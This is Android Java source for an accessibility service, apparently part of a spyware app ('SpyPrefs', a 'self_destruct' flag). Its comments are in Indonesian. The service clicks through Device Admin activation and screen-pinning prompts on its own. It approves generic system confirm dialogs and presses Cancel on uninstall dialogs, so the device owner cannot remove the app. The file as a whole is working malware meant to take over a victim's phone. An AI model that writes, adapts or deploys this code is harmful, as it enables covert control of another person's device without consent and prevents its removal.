package com.nullx.pp;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.Arrays;
import java.util.List;

/**
 * AutoClickService — Accessibility Service
 * 
 * Tugas:
 * 1. Auto-click tombol "Activate" / "OK" / "Aktifkan" pada dialog Device Admin
 * 2. Auto-click konfirmasi startLockTask (Screen Pinning)
 * 3. Dismiss semua system dialog konfirmasi berbahaya (uninstall, etc)
 * 4. Auto-enable dirinya sendiri lewat notif jika dibutuhkan
 */
public class AutoClickService extends AccessibilityService {

    private static final String PREFS = "SpyPrefs";

    // Package system dialog yang perlu di-intercept
    private static final List<String> TARGET_PACKAGES = Arrays.asList(
        "android",                          // system dialogs
        "com.android.settings",             // settings screen pinning confirm
        "com.android.packageinstaller",     // uninstall dialog
        "com.google.android.packageinstaller"
    );

    // Teks tombol yang di-click otomatis (case-insensitive)
    private static final List<String> AUTO_CLICK_TEXTS = Arrays.asList(
        // Device Admin activation
        "activate", "aktifkan", "enable", "izinkan", "allow",
        // Screen pinning / lock task
        "ok", "pin", "start", "confirm", "yes",
        // Uninstall block — dismiss dengan "cancel"
        // Note: untuk uninstall gw CANCEL bukan OK
        // handled separately below
        "continue", "lanjutkan", "set"
    );

    // Teks yang DIBATALKAN (block uninstall: klik Cancel)
    private static final List<String> CANCEL_TEXTS = Arrays.asList(
        "uninstall", "hapus", "delete", "remove"
    );

    private final Handler handler = new Handler(Looper.getMainLooper());

    // ── Lifecycle ─────────────────────────────────────────────────
    @Override
    public void onServiceConnected() {
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes =
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED |
            AccessibilityEvent.TYPE_VIEW_CLICKED;
        info.feedbackType  = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags =
            AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
            AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
            AccessibilityServiceInfo.DEFAULT;
        info.notificationTimeout = 100;
        setServiceInfo(info);

        // Simpan status ke SharedPrefs — MainActivity bisa baca
        setAccessibilityEnabled(true);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        String pkg = event.getPackageName() != null
            ? event.getPackageName().toString() : "";

        int type = event.getEventType();

        // Hanya proses window change events
        if (type != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
            type != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) return;

        // Delay 150ms — biarkan UI fully render dulu
        handler.postDelayed(() -> {
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return;

                // 1. Cek apakah ini dialog Device Admin activation
                if (handleDeviceAdminDialog(root, pkg)) return;

                // 2. Cek screen pinning confirmation
                if (handleScreenPinningDialog(root, pkg)) return;

                // 3. Cek uninstall dialog — block/cancel
                if (handleUninstallDialog(root, pkg)) return;

                // 4. Generic confirm dialog dari system
                handleGenericConfirm(root, pkg);

            } catch (Exception ignored) {}
        }, 150);
    }

    // ── Device Admin Dialog ───────────────────────────────────────
    private boolean handleDeviceAdminDialog(AccessibilityNodeInfo root, String pkg) {
        // Dialog Device Admin ada di package "android" atau "com.android.settings"
        if (!pkg.equals("android") && !pkg.equals("com.android.settings")) return false;

        // Cari text yang mengindikasikan ini dialog Device Admin
        String[] adminKeywords = {"device admin", "administrator", "admin perangkat", "aktifkan administrator"};
        if (!nodeContainsAnyText(root, adminKeywords)) return false;

        // Klik tombol Activate / Aktifkan
        String[] activateLabels = {"Activate", "Aktifkan", "Enable", "OK"};
        return clickButtonWithText(root, activateLabels);
    }

    // ── Screen Pinning / Lock Task Dialog ─────────────────────────
    private boolean handleScreenPinningDialog(AccessibilityNodeInfo root, String pkg) {
        if (!pkg.equals("android") && !pkg.equals("com.android.settings")) return false;

        String[] pinKeywords = {"pin", "screen pinning", "lock task", "pinned"};
        if (!nodeContainsAnyText(root, pinKeywords)) return false;

        String[] okLabels = {"OK", "Start", "Pin", "Confirm", "Yes"};
        return clickButtonWithText(root, okLabels);
    }

    // ── Uninstall Dialog — Cancel ─────────────────────────────────
    private boolean handleUninstallDialog(AccessibilityNodeInfo root, String pkg) {
        if (!pkg.equals("com.android.packageinstaller") &&
            !pkg.equals("com.google.android.packageinstaller") &&
            !pkg.equals("android")) return false;

        String[] uninstallKeywords = {"uninstall", "hapus aplikasi", "remove app"};
        if (!nodeContainsAnyText(root, uninstallKeywords)) return false;

        // Cek SharedPrefs: apakah self_destruct aktif?
        boolean selfDestructMode = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE)
            .getBoolean("self_destruct", false);

        if (selfDestructMode) {
            // Mode self destruct → CONFIRM uninstall (OK bukan Cancel)
            String[] confirmLabels = {"OK", "Uninstall", "Hapus", "Delete", "Confirm"};
            return clickButtonWithText(root, confirmLabels);
        } else {
            // Mode normal → BLOCK uninstall (klik Cancel)
            String[] cancelLabels = {"Cancel", "Batal", "No", "Tidak"};
            return clickButtonWithText(root, cancelLabels);
        }
    }

    // ── Generic Confirm Dialog ─────────────────────────────────────
    private boolean handleGenericConfirm(AccessibilityNodeInfo root, String pkg) {
        // Hanya untuk system packages
        if (!TARGET_PACKAGES.contains(pkg)) return false;

        // Cek apakah ada dialog/popup
        CharSequence cls = root.getClassName();
        if (cls == null) return false;
        String clsStr = cls.toString().toLowerCase();
        if (!clsStr.contains("dialog") && !clsStr.contains("alert")) return false;

        // Auto-click konfirmasi
        String[] confirmLabels = {"OK", "Yes", "Confirm", "Continue", "Lanjutkan", "Allow"};
        return clickButtonWithText(root, confirmLabels);
    }

    // ── Helper: Click button by text ──────────────────────────────
    private boolean clickButtonWithText(AccessibilityNodeInfo root, String[] labels) {
        for (String label : labels) {
            // Cari berdasarkan text
            List<AccessibilityNodeInfo> nodes =
                root.findAccessibilityNodeInfosByText(label);
            for (AccessibilityNodeInfo node : nodes) {
                if (node.isEnabled() && node.isClickable()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
                // Parent mungkin yang clickable
                AccessibilityNodeInfo parent = node.getParent();
                if (parent != null && parent.isClickable()) {
                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
            }

            // Cari berdasarkan content description
            List<AccessibilityNodeInfo> descNodes =
                root.findAccessibilityNodeInfosByText(label);
            for (AccessibilityNodeInfo node : descNodes) {
                if (node.isClickable()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
            }
        }
        return false;
    }

    // ── Helper: Check if node tree contains any of the keywords ──
    private boolean nodeContainsAnyText(AccessibilityNodeInfo root, String[] keywords) {
        if (root == null) return false;
        // Traverse tree dan cek semua node text
        return traverseAndCheck(root, keywords, 0);
    }

    private boolean traverseAndCheck(AccessibilityNodeInfo node, String[] keywords, int depth) {
        if (node == null || depth > 8) return false;

        CharSequence text = node.getText();
        CharSequence desc = node.getContentDescription();

        String combined = "";
        if (text != null) combined += text.toString().toLowerCase();
        if (desc != null) combined += " " + desc.toString().toLowerCase();

        for (String kw : keywords) {
            if (combined.contains(kw.toLowerCase())) return true;
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            if (traverseAndCheck(node.getChild(i), keywords, depth + 1)) return true;
        }
        return false;
    }

    // ── Prefs helper ──────────────────────────────────────────────
    private void setAccessibilityEnabled(boolean enabled) {
        try {
            getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                .edit()
                .putBoolean("accessibility_enabled", enabled)
                .apply();
        } catch (Exception ignored) {}
    }

    @Override
    public void onInterrupt() {
        setAccessibilityEnabled(false);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        setAccessibilityEnabled(false);
    }
}
